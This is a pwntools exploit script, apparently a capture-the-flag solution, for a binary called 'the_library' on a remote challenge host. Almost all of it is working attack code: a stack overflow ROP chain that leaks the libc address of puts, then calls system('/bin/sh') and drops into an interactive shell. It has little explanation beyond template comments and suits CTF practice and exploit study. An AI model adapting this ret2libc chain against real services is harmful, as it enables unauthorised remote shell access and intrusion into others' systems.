#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challenge.ctf.games --port 31125 ./the_library
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./the_library')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challenge.ctf.games'
port = int(args.PORT or 31125)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *main+382
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

# if args.LOCAL :
#     libc=ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
# else:
#     libc=ELF("libc-2.31.so")

libc = exe.libc
pop_rdi = 0x0000000000401493
p ='a'*0x228
p += p64(pop_rdi)
p += p64(exe.got['puts'])
p += p64(exe.plt['puts'])
p += p64(exe.sym['main'])
io.sendlineafter("> ",p)
io.recvuntil("Wrong :(\n")
leak = u64(io.recvline()[:-1].ljust(8,'\x00'))
print hex(leak)
libc.address = leak - libc.sym['puts']
print hex(libc.address)

p ='a'*0x228
p += p64(pop_rdi)
p += p64(libc.search("/bin/sh").next())
p += p64(pop_rdi+1)
p += p64(libc.sym['system'])
# p += p64(exe.sym['main'])
io.sendlineafter("> ",p)

io.interactive()

